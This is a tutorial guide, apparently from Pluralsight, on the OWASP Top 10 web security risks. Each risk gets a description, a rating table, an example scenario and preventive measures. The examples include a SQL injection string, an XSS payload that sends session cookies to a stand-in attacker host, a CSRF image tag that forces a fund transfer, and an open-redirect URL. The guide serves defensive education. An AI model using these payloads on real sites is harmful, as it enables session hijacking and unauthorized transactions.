# Top-10 OWASP Critical Security Areas
This guide will cover the importance of Web security and will explain the primary ways that websites become exposed to attackers. In specific, we will look into the top-10 OWASP security risks, their impacts, and preventive measures to mitigate attacks.

### About OWASP

The [__Open Web Application Security Project__](https://www.owasp.org) is a _non-profit_ educational
charity dedicated to enabling organizations to design, develop, acquire, operate, and maintain
secure software. 

OWASP is not affiliated with any technology company. Similar to many open­source software projects, OWASP produces many types of materials in a collaborative and open way. All OWASP tools, documents, forums, and chapters are free and open to anyone interested in improving application security.

### Introduction to Websecurity risk

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/2bb93931-db94-4cf4-ac6d-82eb3dd560f4.jpg)

Websites and Web-Servers are prone to security risks and [attacks](https://www.owasp.org/index.php/Category:Attack) due to insecure software and a lack of security principles. In recent years a range of different industries worldwide have [suffered from online attacks](http://map.norsecorp.com/#/), including finance, defense, and healthcare.

The goal of the OWASP  is to raise awareness about web application security by describing the most important areas of concern that software developers need to address.




### What are the top ten vulnerablities?

As stated on the [OWASP page](https://www.owasp.org/index.php/Top_10_2013-Top_10), the top ten vulnerabilities are:

1. SQL-Injection
2. Broken Authentication and Session Management
3. Cross-Site Scripting (XSS)
4. Insecure Direct Object References
5. Security Misconfiguration
6. Sensitive Data Exposure
7. Missing Function Level Access Control
8. Cross-Site Request Forgery (CSRF)
9. Using Components with Known Vulnerabilities
10. Unvalidated Redirects and Forwards

Let's understand each risk in detail.

### __1. SQL-Injection__


![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/c73b8611-3b98-4932-a81a-eedfa0fcaa05.png)


SQL injection (SQLi) refers to an [injection attack](https://en.wikipedia.org/wiki/Code_injection) in which an attacker alters SQL statements to take over an application's database server.

A successful SQL injection can allow the attacker to:
* Read sensitive data from the database 
* Modify the database
* Execute administrator-level operations, such as shutdown the DBMS (Database Management System)
* Recover the content of a given file present on the DBMS file system
* Issue commands to the operating system (rare, but [possible](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-slides))


Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
EASY | COMMON   | AVERAGE |SEVERE

**Example Scenario :**
The application uses untrusted data in the construction of the following vulnerable SQL call:
```
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```
In this case, the attacker modifies the `id` parameter value in browser to a true value, such as `' '` or `'1'='1`:
```
http://example.com/app/accountView?id=' or '1'='1
```
This changes the meaning of the query, and it now returns __all__ the records from the accounts table.

**Preventive Measures **
1. Keep untrusted data separate from commands and queries.
2. Use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface.
3. If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.


### **2. Broken Authentication and Session Management**


![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/a6b69ff8-4d55-4d65-b775-ac987112de7a.png)


Application functions related to authentication and session management are often not implemented correctly, thus compromising passwords, keys, or session tokens.

Obviously, authentication and timeout flaws put businesses at risk of losing confidential data and give hackers a back door to the entire company.

Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
AVERAGE | WIDESPREAD   | AVERAGE |SEVERE

**Example scenario**: Session timeouts aren’t set properly. A user uses a public computer to access the site. Instead of selecting _“logout”_ the user simply closes the browser tab and walks away. The attacker can use the same browser an hour later, and that browser is still authenticated (no session timeout).

**Preventive Measures **
1. Implement a single set of strong authentication and session management controls. 
2. Avoid [Cross-Site Scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting) flaws which can be used to steal session IDs.
3. Implement proper application session timeout protocol.
4. Consider the [ESAPI Authenticator and User APIs](http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Authenticator.html) as good examples.


### **3. Cross-Site Scripting (XSS)**

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/cf94e0ae-5a50-4830-9d44-66ffe0cdcfff.png)


As mentioned in the session management and authentication section, XSS flaws can take down a web application. These occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hi-jack user sessions, deface web sites, or redirect the user to malicious sites.


Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
AVERAGE | VERY WIDESPREAD   | EASY | MODERATE

**Example scenario** : The application uses untrusted data and uses the following HTML snippet without validation or escaping:
```
(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
```
The attacker modifies the 'CC' parameter in their browser to:
```
'><script>document.location= 'http://www.attacker.com/cgi-bin/cookie.cgi ?foo='+document.cookie</script>'.
```
This one-line modification causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.


**Preventive Measures **

1. Escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL).
2. Whitelist server-side input validation.
3. Consider Content Security Policy [CSP](https://www.owasp.org/index.php/Content_Security_Policy) to defend against XSS across your entire site.

### **4. Insecure Direct Object References**


![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/5ab3d4f6-1604-4bde-b03f-eed5e2ca1ecd.png)

A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. 

Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.


Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
EASY | COMMON  | EASY | MODERATE

**Example scenario** : The application uses unverified data in a SQL call that is accessing account information:
```
String query = "SELECT * FROM accts WHERE account = ?";

PreparedStatement pstmt = connection.prepareStatement(query , … );

pstmt.setString( 1, request.getParameter("acct"));

ResultSet results = pstmt.executeQuery( );
```
The attacker simply modifies the ‘acct’ parameter in their browser to send any account number they want. So if the account parameter is not verified (cross-checked with existing accounts), the attacker can access **any** user’s account, not just the intended customer’s account.
```
http://example.com/app/accountInfo?acct=notmyacct
```
**Preventive Measures **
1. Use per-user or session-indirect object references to prevent attackers from directly targeting unauthorized resources. See [these posts](http://security.stackexchange.com/questions/38777/how-do-indirect-session-specific-resource-tokens-increase-security) on how the latter can improve security.
2. **Check access**. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.

### **5. Security Misconfiguration**

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/7f613f20-e682-4bb5-a208-5414ec2f57c9.png)


Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and so on. 

Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.

If an attacker discovers improper security configuration, s/he can login with default credetials and take over application as an admin.


Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
EASY | COMMON  | EASY | MODERATE

**Example scenario**: An app's server configuration allows stack traces to be returned to users, potentially exposing underlying flaws. Attackers love the extra information provided by error messages. 

See [this discussion](http://programmers.stackexchange.com/questions/162007/should-a-stack-trace-be-in-the-error-message-presented-to-the-user) on stack traces and security for more.

**Preventive Measures **

1. Development, QA, and production environments should all be configured identically (with different passwords used in each environment).
2. A process should be maintained for keeping track of deploying all new software updates and patches in a timely manner to each deployed environment. 
3. Consider running scans and doing periodical audits to help detect future misconfigurations or missing patches.

### **6. Sensitive Data Exposure**


![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/57fac4bd-5ce1-4531-8eb8-b5b4082b0a6f.png)

Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly-protected data to conduct credit card fraud, identity theft, or other crimes.

Sensitive data deserves extra protection such as [encryption at rest](https://en.wikipedia.org/wiki/Data_at_rest#Encryption) or in transit, as well as special precautions for data exchanged with the browser.

Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
DIFFICULT | UNCOMMON  | AVERAGE | SEVERE

**Example scenario** :  A site simply doesn’t use SSL for all authenticated pages. Attacker simply monitors network traffic (like an open wireless network), and steals the user’s session cookie. Attacker then replays this cookie and hijacks the user’s session, accessing the user’s private data.

**Preventive Measures **

1. Encrypt all sensitive data at rest and in transit in a manner that defends against these threats.
2. Don’t store sensitive data unnecessarily. Discard it as soon as possible!
3. Ensure that you're using standard algorithms and strong keys and that proper key management is in place. [Validated cryptograpic modules](http://csrc.nist.gov/groups/STM/cmvp/documents/140-1/140val-all.htm).
4. Ensure that passwords are stored with an algorithm specifically designed for password protection, such as [bcrypt](http://en.wikipedia.org/wiki/Bcrypt), [PBKDF2](http://en.wikipedia.org/wiki/PBKDF2), or [scrypt](http://en.wikipedia.org/wiki/Scrypt).


### ** 7. Missing Function Level Access Control **

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/b9de5fbf-4cf1-4dad-afd3-7493431dff8d.png)


Most web applications verify function-level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. 

If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization.



Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
EASY | COMMON  | AVERAGE | MODERATE

**Example scenario** : The attacker uses [forced-browsing](https://www.owasp.org/index.php/Forced_browsing) to target URLs. 

Consider the following URLs. They require authentication. Admin rights are also required for access to the admin_getappInfo page.

```
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
```
If an unauthenticated user can access either page, that’s a flaw. If an authenticated, non-admin, user is allowed to access the admin_getappInfo page, this is also a flaw. Such flaws may put other admin pages at risk.


**Preventive Measures **

1. Your application should have a consistent, easy authorization module that is invoked from all of your business functions.
2. Implement the process for managing entitlements and ensure that you can update and audit it easily. **Don’t hard code.**
3. Use enforcement mechanism(s) that deny all access by default and require explicit grants to specific roles for access to every function.

### **8. Cross-Site Request Forgery (CSRF)**

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/affa4ec1-ac6d-43eb-a7ed-792e19bce4bc.png)


A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. 

This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim.


Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
AVERAGE | COMMON  | EASY | MODERATE


**Example scenario** : The application allows a user to submit a state changing request that does not include anything secret. For example:
```
http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243
```
So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:
```
<img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#" width="0" height="0" />
```
If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.


**Preventive Measures **

1. Include the unique token in a hidden field. This causes the value to be sent in the body of the HTTP request.
2. Require the user to reauthenticate or prove they are a user (e.g., via a CAPTCHA Or OTP). 



### ** 9. Using Components with Known Vulnerabilities **


![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/c719da9d-5e2d-419c-81d3-e61a1ece9995.png)


Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. 

Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts.

Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
AVERAGE | COMMON  | EASY | MODERATE

**Example scenario**: Components almost always run with the full privilege of the application, so flaws in any component can be serious, The following two vulnerable components were downloaded 22 million times in 2011.

1. [Apache CXF Authentication Bypass](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3451) – By failing to provide an identity token, attackers could invoke any web service with full permission.
2. [Spring Remote Code Execution](http://www.infosecurity-magazine.com/view/30282/remote-code-vulnerability-in-spring-framework-for-java/) – Abuse of the Expression Language implementation in Spring allowed attackers to execute arbitrary code, effectively taking over the server.

**Preventive Measures **

1. Identify all components and the versions in use, including all dependencies.
2. Monitor the security of these components in public databases, project mailing lists, and security mailing lists, and keep them up to date.
3. Establish security policies governing component use, such as requiring certain software development practices, passing security tests, and acceptable licenses.


### ** 10. Unvalidated Redirects and Forwards **

![description](https://raw.githubusercontent.com/pluralsight/guides/master/images/ff3889b5-1c7a-46a8-8eeb-1e8f3f4ab780.png)


Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages.

Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized page.

Exploitability | Prevalence | Detectability | Impact
------------------- | -------------------- | ------------
AVERAGE | UNCOMMON  | EASY | MODERATE


**Example scenario**:  The application has a page called “redirect.jsp” which takes a single parameter named “url”. The attacker forms a malicious URL that redirects users to a malicious site that performs phishing and installs malware.
```
http://www.example.com/redirect.jsp?url=evil.com
```

**Preventive Measures **

1. Simply avoid using redirects and forwards.
2. When using redirects or forwards, don’t involve user parameters in calculating the destination.
3. If destination parameters can’t be avoided, validate the supplied value, and ensure that it is authorized for the user.


#### So What's next for Developers?

Whether you are new to web application security or familiar with these risks, the task of producing and maintaining a secure web application can be difficult.

To help organizations and developers reduce their application security risks in a cost effective manner, OWASP has produced numerous free and open resources that you can use to address application security in your organization. Follow this [URL](https://www.owasp.org/index.php/Top_10_2013-What%27s_Next_for_Developers) for better insight.


> If you have found this guide informative, please favorite it and add your feedback to the discussion section below. 
























